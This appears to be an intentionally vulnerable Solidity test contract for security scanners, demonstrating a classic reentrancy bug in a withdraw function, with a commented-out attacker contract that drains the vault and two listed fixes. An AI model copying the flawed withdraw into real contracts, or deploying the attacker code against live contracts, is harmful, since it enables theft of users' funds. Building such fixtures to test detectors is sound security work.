// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Vulnerable Reentrancy Contract
 * @notice This contract demonstrates a classic reentrancy vulnerability
 * @dev INTENTIONALLY VULNERABLE - FOR TESTING ONLY
 *
 * Vulnerability: Reentrancy attack on withdraw function
 * Expected Detection: Slither, Mythril, Foundry (invariant tests)
 * Severity: CRITICAL
 *
 * Attack Scenario:
 * 1. Attacker deposits 1 ETH
 * 2. Attacker calls withdraw() from malicious contract
 * 3. In receive() fallback, attacker calls withdraw() again before balance is updated
 * 4. Repeat until vault is drained
 *
 * Real-world examples: The DAO ($60M), Cream Finance ($130M)
 */
contract VulnerableReentrancy {
    mapping(address => uint256) public balances;

    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);

    /// @notice Deposit ETH into the vault
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    /// @notice Withdraw ETH from vault
    /// @dev VULNERABLE: External call before state update!
    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "No balance");

        // VULNERABILITY: External call BEFORE state update
        (bool success,) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");

        // TOO LATE: Balance update happens after external call
        balances[msg.sender] = 0;

        emit Withdrawal(msg.sender, balance);
    }

    /// @notice Get contract balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * Example Attack Contract:
 *
 * contract Attacker {
 *     VulnerableReentrancy public victim;
 *
 *     constructor(address _victim) {
 *         victim = VulnerableReentrancy(_victim);
 *     }
 *
 *     function attack() external payable {
 *         victim.deposit{value: 1 ether}();
 *         victim.withdraw();
 *     }
 *
 *     receive() external payable {
 *         if (address(victim).balance >= 1 ether) {
 *             victim.withdraw(); // Reentrant call!
 *         }
 *     }
 * }
 *
 * Fix:
 * 1. Use checks-effects-interactions pattern:
 *    balances[msg.sender] = 0;  // Update state FIRST
 *    (bool success,) = msg.sender.call{value: balance}("");
 *
 * 2. Or use ReentrancyGuard from OpenZeppelin:
 *    function withdraw() external nonReentrant { ... }
 */
